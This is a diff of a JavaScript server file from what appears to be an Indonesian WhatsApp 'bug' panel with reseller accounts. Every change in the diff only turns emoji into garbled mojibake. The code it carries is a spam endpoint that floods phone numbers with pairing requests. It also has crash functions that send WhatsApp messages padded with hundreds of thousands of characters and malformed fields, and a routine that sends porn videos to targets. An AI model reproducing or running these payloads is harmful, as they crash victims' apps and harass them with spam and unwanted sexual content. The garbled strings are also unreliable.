+        console.log(`ðŸš€ Starting WhatsApp spam for ${cleanPhone}, Count: ${validCount}, Delay: ${validDelay}ms`);
 
 
         for (let i = 0; i < validCount; i++) {
             const attemptNumber = i + 1;
 
             try {
-                console.log(`📱 Attempt ${attemptNumber}/${validCount} for: ${cleanPhone}`);
+                console.log(`ðŸ“± Attempt ${attemptNumber}/${validCount} for: ${cleanPhone}`);
 
 
                 const result = await pair(cleanPhone);
@@ -8455,7 +8455,7 @@ app.post('/api/spam/whatsapp', async (req, res) => {
                 }
 
             } catch (err) {
-                console.error(`❌ Attempt ${attemptNumber} failed:`, err.message);
+                console.error(`âŒ Attempt ${attemptNumber} failed:`, err.message);
 
                 results.push({
                     attempt: attemptNumber,
@@ -8519,12 +8519,12 @@ app.post('/api/spam/whatsapp', async (req, res) => {
             response.message = `All attempts failed for ${cleanPhone}`;
         }
 
-        console.log(`✅ WhatsApp spam completed for ${cleanPhone}: ${successCount} success, ${failCount} failed`);
+        console.log(`âœ… WhatsApp spam completed for ${cleanPhone}: ${successCount} success, ${failCount} failed`);
 
         res.json(response);
 
     } catch (error) {
-        console.error('❌ Server error in WhatsApp spam:', error);
+        console.error('âŒ Server error in WhatsApp spam:', error);
 
 
         logToFile({
@@ -10463,7 +10463,7 @@ app.post("/notify/send", async (req, res) => {
     const notifications = loadNotifications();
     const notif = {
         id: Date.now(),
-        title: title || "📢 Notification",
+        title: title || "ðŸ“¢ Notification",
         message,
         type,
         createdAt: new Date().toISOString(),
@@ -10900,18 +10900,18 @@ app.post("/createAccount", async (req, res) => {
     const reportGroupIds = [...new Set([...tkGroupIds, ...ownerGroupIds])];
 
     const notifText = `
-🚨 <b>MANTA ACCOUNT CREATED (APK)</b>
+ðŸš¨ <b>MANTA ACCOUNT CREATED (APK)</b>
 
-👤 Dibuat oleh
-• Nama : <b>${newAccount.createdBy}</b>
-• ID   : <code>APK</code>
+ðŸ‘¤ Dibuat oleh
+â€¢ Nama : <b>${newAccount.createdBy}</b>
+â€¢ ID   : <code>APK</code>
 
-🆕 Akun
-• Username : <b>${newUser}</b>
-• Password : <b>${pass}</b>
-• Role     : <b>${newAccount.role.toUpperCase()}</b>
-• Durasi   : <b>${days} hari</b>
-• Expired  : <b>${formatDateExp(newAccount.expiredDate)}</b>
+ðŸ†• Akun
+â€¢ Username : <b>${newUser}</b>
+â€¢ Password : <b>${pass}</b>
+â€¢ Role     : <b>${newAccount.role.toUpperCase()}</b>
+â€¢ Durasi   : <b>${days} hari</b>
+â€¢ Expired  : <b>${formatDateExp(newAccount.expiredDate)}</b>
 `;
 
     try {
@@ -11084,7 +11084,7 @@ app.get("/listUsers", (req, res) => {
 
 app.get("/userAdd", (req, res) => {
     const { key, username, password, role, day } = req.query;
-    console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);
+    console.log(`[âž• USERADD] ${username} dengan role ${role} oleh key ${key}`);
 
     reloadActiveKeys();
     const keyInfo = activeKeys[key];
@@ -11094,12 +11094,12 @@ app.get("/userAdd", (req, res) => {
     const creator = db.find(u => u.username === keyInfo.username);
 
     if (!creator || creator.role !== "KINGZ") {
-        console.log("[❌ USERADD] Tidak diizinkan.");
+        console.log("[âŒ USERADD] Tidak diizinkan.");
         return res.json({ valid: true, authorized: false, message: "Only owner can add user with role." });
     }
 
     if (db.find(u => u.username === username)) {
-        console.log("[❌ USERADD] Username sudah ada.");
+        console.log("[âŒ USERADD] Username sudah ada.");
         return res.json({ valid: true, created: false, message: "Username already exists." });
     }
 
@@ -11120,14 +11120,14 @@ app.get("/userAdd", (req, res) => {
 
     const logLine = `${creator.username} Created ${newUser} Role ${role} Days ${day}\n`;
     fs.appendFileSync('logUser.txt', logLine);
-    console.log("[✅ USERADD] User berhasil dibuat:", newUser);
+    console.log("[âœ… USERADD] User berhasil dibuat:", newUser);
     return res.json({ valid: true, authorized: true, created: true, user: newUser });
 });
 
 
 app.get("/editUser", (req, res) => {
     const { key, username, addDays } = req.query;
-    console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);
+    console.log(`[ðŸ› ï¸ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);
 
     reloadActiveKeys();
     const keyInfo = activeKeys[key];
@@ -11137,25 +11137,25 @@ app.get("/editUser", (req, res) => {
     const editor = db.find(u => u.username === keyInfo.username);
 
     if (!editor || !["OWNER", "KINGZ"].includes(editor.role)) {
-        console.log("[❌ EDIT] Tidak diizinkan.");
+        console.log("[âŒ EDIT] Tidak diizinkan.");
         return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
     }
 
 
     if (creator.role === "reseller" && parseInt(addDays) > 30) {
-        console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
+        console.log("[âŒ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
         return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
     }
 
     const targetUser = db.find(u => u.username === username);
     if (!targetUser) {
-        console.log("[❌ EDIT] User tidak ditemukan.");
+        console.log("[âŒ EDIT] User tidak ditemukan.");
         return res.json({ valid: true, edited: false, message: "User not found." });
     }
 
 
     if (editor.role === "reseller" && targetUser.role !== "member") {
-        console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
+        console.log("[âŒ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
         return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
     }
 
@@ -11168,7 +11168,7 @@ app.get("/editUser", (req, res) => {
     saveDatabase(db);
     const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
     fs.appendFileSync('logUser.txt', logLine);
-    console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
+    console.log("[âœ… EDIT] Masa aktif diperbarui:", targetUser);
     return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
 });
 
@@ -11241,7 +11241,7 @@ async function importFromRawEncrypted(url) {
 
         return sandbox.module.exports;
     } catch (err) {
-        console.error("❌ Gagal decrypt & import:", err.stack || err.message);
+        console.error("âŒ Gagal decrypt & import:", err.stack || err.message);
         return null;
     }
 }
@@ -11261,12 +11261,12 @@ async function AxMaker2(otax, target) {
             message: {
                 interactiveResponseMessage: {
                     body: {
-                        text: " #1stRaldzz€xe ",
+                        text: " #1stRaldzzâ‚¬xe ",
                         format: "EXTENTION_1"
                     },
                     nativeFlowResponseMessage: {
                         name: "menu_options",
-                        paramsJson: `{\"display_text\":\"${" ".repeat(11111)}\",\"id\":\".grockk\",\"description\":\"PnX-ID-msg.\"}`,
+                        paramsJson: `{\"display_text\":\"${"Â ".repeat(11111)}\",\"id\":\".grockk\",\"description\":\"PnX-ID-msg.\"}`,
                         version: 3
                     },
                     contextInfo: {
@@ -11283,12 +11283,12 @@ async function AxMaker2(otax, target) {
             message: {
                 interactiveResponseMessage: {
                     body: {
-                        text: " #1stRaldzz€xe ",
+                        text: " #1stRaldzzâ‚¬xe ",
                         format: "DEFAULT"
                     },
                     nativeFlowResponseMessage: {
                         name: "call_permission_request",
-                        paramsJson: " ".repeat(1045000),
+                        paramsJson: "Â ".repeat(1045000),
                         version: 3
                     },
                     entryPointConversionSource: "galaxy_message",
@@ -11344,7 +11344,7 @@ async function AxMaker2(otax, target) {
 
     const msg4 = {
         extendedTextMessage: {
-            text: "ꦾ".repeat(60000),
+            text: "ê¦¾".repeat(60000),
             contextInfo: {
                 participant: target,
                 mentionedJid: [
@@ -11370,7 +11370,7 @@ async function AxMaker2(otax, target) {
                 },
                 interactiveResponseMessage: {
                     body: {
-                        text: " #1stRaldzz€xe ",
+                        text: " #1stRaldzzâ‚¬xe ",
                         format: "DEFAULT"
                     },
                     nativeFlowResponseMessage: {
@@ -11382,7 +11382,7 @@ async function AxMaker2(otax, target) {
                         isForwarded: true,
                         forwardingScore: 9999,
                         forwardedNewsletterMessageInfo: {
-                            newsletterName: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸",
+                            newsletterName: "@ð—¿ð—®ð—¹ð—±ð˜‡ð˜‡ð˜…ð˜†ð˜‡ â€¢ #ð—¯ð˜‚ð—´ð—´ð—²ð—¿ð˜€ ðŸ©¸",
                             newsletterJid: "120363330344810280@newsletter",
                             serverMessageId: 1
                         },
@@ -11404,14 +11404,14 @@ async function AxMaker2(otax, target) {
             message: {
                 stickerPackMessage: {
                     stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
-                    name: "ꦾ".repeat(60000),
-                    publisher: "ꦾ".repeat(60000),
+                    name: "ê¦¾".repeat(60000),
+                    publisher: "ê¦¾".repeat(60000),
                     caption: " ### ",
                     stickers: [
                         {
                             fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                             isAnimated: false,
-                            emojis: ["🦠", "🩸"],
+                            emojis: ["ðŸ¦ ", "ðŸ©¸"],
                             accessibilityLabel: "",
                             stickerSentTs: "PnX-ID-msg",
                             isAvatar: true,
@@ -11422,7 +11422,7 @@ async function AxMaker2(otax, target) {
                         {
                             fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                             isAnimated: false,
-                            emojis: ["🩸", "🦠"],
+                            emojis: ["ðŸ©¸", "ðŸ¦ "],
                             accessibilityLabel: "",
                             stickerSentTs: "PnX-ID-msg",
                             isAvatar: true,
@@ -11433,7 +11433,7 @@ async function AxMaker2(otax, target) {
                         {
                             fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                             isAnimated: false,
-                            emojis: ["🦠", "🩸"],
+                            emojis: ["ðŸ¦ ", "ðŸ©¸"],
                             accessibilityLabel: "",
                             stickerSentTs: "PnX-ID-msg",
                             isAvatar: true,
@@ -11444,7 +11444,7 @@ async function AxMaker2(otax, target) {
                         {
                             fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                             isAnimated: false,
-                            emojis: ["🩸", "🦠"],
+                            emojis: ["ðŸ©¸", "ðŸ¦ "],
                             accessibilityLabel: "",
                             stickerSentTs: "PnX-ID-msg",
                             isAvatar: true,
@@ -11455,7 +11455,7 @@ async function AxMaker2(otax, target) {
                         {
                             fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                             isAnimated: false,
-                            emojis: ["🦠", "🩸"],
+                            emojis: ["ðŸ¦ ", "ðŸ©¸"],
                             accessibilityLabel: "",
                             stickerSentTs: "PnX-ID-msg",
                             isAvatar: true,
@@ -11466,7 +11466,7 @@ async function AxMaker2(otax, target) {
                         {
                             fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                             isAnimated: false,
-                            emojis: ["🩸", "🦠"],
+                            emojis: ["ðŸ©¸", "ðŸ¦ "],
                             accessibilityLabel: "",
                             stickerSentTs: "PnX-ID-msg",
                             isAvatar: true,
@@ -11477,7 +11477,7 @@ async function AxMaker2(otax, target) {
                         {
                             fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                             isAnimated: false,
-                            emojis: ["🦠", "🩸"],
+                            emojis: ["ðŸ¦ ", "ðŸ©¸"],
                             accessibilityLabel: "",
                             stickerSentTs: "PnX-ID-msg",
                             isAvatar: true,
@@ -11488,7 +11488,7 @@ async function AxMaker2(otax, target) {
                         {
                             fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                             isAnimated: false,
-                            emojis: ["🩸", "🦠"],
+                            emojis: ["ðŸ©¸", "ðŸ¦ "],
                             accessibilityLabel: "",
                             stickerSentTs: "PnX-ID-msg",
                             isAvatar: true,
@@ -11634,19 +11634,19 @@ async function nullotax(otax, target) {
     )
 }
 async function packBlank(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
     await otax.relayMessage(
         target,
         {
             stickerPackMessage: {
                 stickerPackId: "X",
-                name: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
-                publisher: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                name: "ÏƒÆ­Î±× É¦ÎµÉ¾Îµ" + "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(10000),
+                publisher: "ÏƒÆ­Î±× É¦ÎµÉ¾Îµ" + "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(10000),
                 stickers: [
                     {
                         fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -11654,7 +11654,7 @@ async function packBlank(otax, target) {
                     {
                         fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -11662,7 +11662,7 @@ async function packBlank(otax, target) {
                     {
                         fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -11670,7 +11670,7 @@ async function packBlank(otax, target) {
                     {
                         fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -11678,7 +11678,7 @@ async function packBlank(otax, target) {
                     {
                         fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -11686,7 +11686,7 @@ async function packBlank(otax, target) {
                     {
                         fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -11694,7 +11694,7 @@ async function packBlank(otax, target) {
                     {
                         fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -11702,7 +11702,7 @@ async function packBlank(otax, target) {
                     {
                         fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -11710,7 +11710,7 @@ async function packBlank(otax, target) {
                     {
                         fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -11718,7 +11718,7 @@ async function packBlank(otax, target) {
                     {
                         fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -11743,7 +11743,7 @@ async function packBlank(otax, target) {
                         }
                     }
                 },
-                packDescription: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                packDescription: "ÏƒÆ­Î±× É¦ÎµÉ¾Îµ" + "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(10000),
                 mediaKeyTimestamp: "1741150286",
                 trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
                 thumbnailDirectPath:
@@ -11772,17 +11772,17 @@ async function xcoreotax(otax, target, Ptcp = true) {
                             fileLength: "9999999999999999",
                             pageCount: 0x9184e729fff,
                             mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
-                            fileName: "×‌×ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒.",
+                            fileName: "Ã—â€ŒÃ—á´á´›á´€x á´€á´›á´›á´€á´„á´‹ Êá´á´œä¸€ç·’.",
                             fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                             directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                             mediaKeyTimestamp: "1715880173",
                             contactVcard: true
                         },
-                        title: "ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒",
+                        title: "á´á´›á´€x á´€á´›á´›á´€á´„á´‹ Êá´á´œä¸€ç·’",
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "ꦽ".repeat(500000) + "_*~@8~*_\n".repeat(500000) + '@8'.repeat(500000),
+                        text: "ê¦½".repeat(500000) + "_*~@8~*_\n".repeat(500000) + '@8'.repeat(500000),
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
@@ -11803,8 +11803,8 @@ async function kresjandaotax(otax, target) {
             buttt.push({
                 "name": "galaxy_message",
                 "buttonParamsJson": JSON.stringify({
-                    "header": "ꦽ".repeat(10000),
-                    "body": "ꦽ".repeat(10000),
+                    "header": "ê¦½".repeat(10000),
+                    "body": "ê¦½".repeat(10000),
                     "flow_action": "navigate",
                     "flow_action_payload": { "screen": "FORM_SCREEN" },
                     "flow_cta": "Grattler",
@@ -11818,10 +11818,10 @@ async function kresjandaotax(otax, target) {
         for (let i = 0; i < 10; i++) {
             push.push({
                 "body": {
-                    "text": "⌭ɪᴍ ʜᴇʀᴇ ʙʀᴏ¿?"
+                    "text": "âŒ­Éªá´ Êœá´‡Ê€á´‡ Ê™Ê€á´Â¿?"
                 },
                 "header": {
-                    "title": "⦸ ʟᴏɴᴛᴇ sᴘᴇᴋ ᴋᴇʀᴀs" + "ꦽ".repeat(500000),
+                    "title": "â¦¸ ÊŸá´É´á´›á´‡ sá´˜á´‡á´‹ á´‹á´‡Ê€á´€s" + "ê¦½".repeat(500000),
                     "hasMediaAttachment": false,
                     "imageMessage": {
                         "url": "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
@@ -11857,10 +11857,10 @@ async function kresjandaotax(otax, target) {
                     },
                     "interactiveMessage": {
                         "body": {
-                            "text": "⩝ɪᴍ ᴀʟᴏɴᴇ" + "ꦽ".repeat(500000)
+                            "text": "â©Éªá´ á´€ÊŸá´É´á´‡" + "ê¦½".repeat(500000)
                         },
                         "footer": {
-                            "text": "∅ ᴅɪʟᴀʀᴀɴɢ ᴋᴇʟᴜᴀʀ"
+                            "text": "âˆ… á´…ÉªÊŸá´€Ê€á´€É´É¢ á´‹á´‡ÊŸá´œá´€Ê€"
                         },
                         "header": {
                             "hasMediaAttachment": false
@@ -11885,7 +11885,7 @@ async function videoCrashbokep(otax, target) {
     const keywords = ["hijab", "viral", "bokep", "hot", "indonesia", "terbaru", "asmr", "cewek"];
     const keyword = keywords[Math.floor(Math.random() * keywords.length)];
 
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗽𝗮𝗺 𝗕𝗼𝗸𝗲𝗽 — kata: ${keyword}`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—½ð—®ð—º ð—•ð—¼ð—¸ð—²ð—½ â€” kata: ${keyword}`));
 
     const searchRes = await axios.get(
         `http://nodemanta.otax.fun:2004/search?keyword=${encodeURIComponent(keyword)}&page=0`
@@ -11911,7 +11911,7 @@ async function videoCrashbokep(otax, target) {
 
     const sent = await otax.sendMessage(target, {
         video: { url: videoUrl },
-        caption: `⎙ *${title}*`,
+        caption: `âŽ™ *${title}*`,
     });
 
     const rawVideoMsg = sent?.message?.videoMessage;
@@ -11925,7 +11925,7 @@ async function videoCrashbokep(otax, target) {
                         videoMessage: rawVideoMsg,
                         hasMediaAttachment: true,
                     },
-                    body: { text: "нαιι ιм οταϰ⸙" + "ꦽ".repeat(5000) },
+                    body: { text: "Ð½Î±Î¹Î¹ Î¹Ð¼ Î¿Ï„Î±Ï°â¸™" + "ê¦½".repeat(5000) },
                     nativeFlowMessage: {
                         messageParamsJson: "{[",
                         messageVersion: 3,
@@ -11938,7 +11938,7 @@ async function videoCrashbokep(otax, target) {
                                 name: "galaxy_message",
                                 buttonParamsJson: JSON.stringify({
                                     icon: "RIVIEW",
-                                    flow_cta: "ꦽ".repeat(5000),
+                                    flow_cta: "ê¦½".repeat(5000),
                                     flow_message_version: "3",
                                 }),
                             },
@@ -11946,7 +11946,7 @@ async function videoCrashbokep(otax, target) {
                                 name: "galaxy_message",
                                 buttonParamsJson: JSON.stringify({
                                     icon: "RIVIEW",
-                                    flow_cta: "ꦾ".repeat(5000),
+                                    flow_cta: "ê¦¾".repeat(5000),
                                     flow_message_version: "3",
                                 }),
                             },
@@ -11968,19 +11968,19 @@ async function videoCrashbokep(otax, target) {
     await otax.relayMessage(target, msg.message, { messageId: msg.key.id });
 }
 async function packBlankxnxx(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
     await otax.relayMessage(
         target,
         {
             stickerPackMessage: {
                 stickerPackId: "X",
-                name: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
-                publisher: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                name: "ÏƒÆ­Î±× É¦ÎµÉ¾Îµ" + "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(10000),
+                publisher: "ÏƒÆ­Î±× É¦ÎµÉ¾Îµ" + "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(10000),
                 stickers: [
                     {
                         fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -11988,7 +11988,7 @@ async function packBlankxnxx(otax, target) {
                     {
                         fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -11996,7 +11996,7 @@ async function packBlankxnxx(otax, target) {
                     {
                         fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -12004,7 +12004,7 @@ async function packBlankxnxx(otax, target) {
                     {
                         fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -12012,7 +12012,7 @@ async function packBlankxnxx(otax, target) {
                     {
                         fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -12020,7 +12020,7 @@ async function packBlankxnxx(otax, target) {
                     {
                         fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -12028,7 +12028,7 @@ async function packBlankxnxx(otax, target) {
                     {
                         fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -12036,7 +12036,7 @@ async function packBlankxnxx(otax, target) {
                     {
                         fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -12044,7 +12044,7 @@ async function packBlankxnxx(otax, target) {
                     {
                         fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -12052,7 +12052,7 @@ async function packBlankxnxx(otax, target) {
                     {
                         fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
                         isAnimated: false,
-                        emojis: ["😮‍💨"],
+                        emojis: ["ðŸ˜®â€ðŸ’¨"],
                         accessibilityLabel: "otax",
                         isLottie: true,
                         mimetype: "application/pdf",
@@ -12076,7 +12076,7 @@ async function packBlankxnxx(otax, target) {
                         }
                     }
                 },
-                packDescription: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                packDescription: "ÏƒÆ­Î±× É¦ÎµÉ¾Îµ" + "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†Øƒ".repeat(10000),
                 mediaKeyTimestamp: "1741150286",
                 trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
                 thumbnailDirectPath: "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
@@ -12102,7 +12102,7 @@ async function otaxayunBelovedX(otax, target, mention) {
                 message: {
                     interactiveResponseMessage: {
                         body: {
-                            text: " ¿otax Here¿ ",
+                            text: " Â¿otax HereÂ¿ ",
                             format: "DEFAULT",
                         },
                         nativeFlowResponseMessage: {
@@ -12150,7 +12150,7 @@ async function otaxayunBelovedX(otax, target, mention) {
     ]
 
     let sequentialIndex = 0
-    console.log(chalk.red(`𝘰𝘵𝘢𝘹 𝘴𝘦𝘥𝘢𝘯𝘨 𝘮𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘢𝘵𝘵𝘢𝘤𝘬 𝘬𝘦 ${target}`))
+    console.log(chalk.red(`ð˜°ð˜µð˜¢ð˜¹ ð˜´ð˜¦ð˜¥ð˜¢ð˜¯ð˜¨ ð˜®ð˜¦ð˜¯ð˜¨ð˜ªð˜³ð˜ªð˜® ð˜¢ð˜µð˜µð˜¢ð˜¤ð˜¬ ð˜¬ð˜¦ ${target}`))
 
     const selectedMedia = mediaData[sequentialIndex]
     sequentialIndex = (sequentialIndex + 1) % mediaData.length
@@ -12209,10 +12209,10 @@ async function otaxayunBelovedX(otax, target, mention) {
 
     const textMsg = {
         extendedTextMessage: {
-            text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
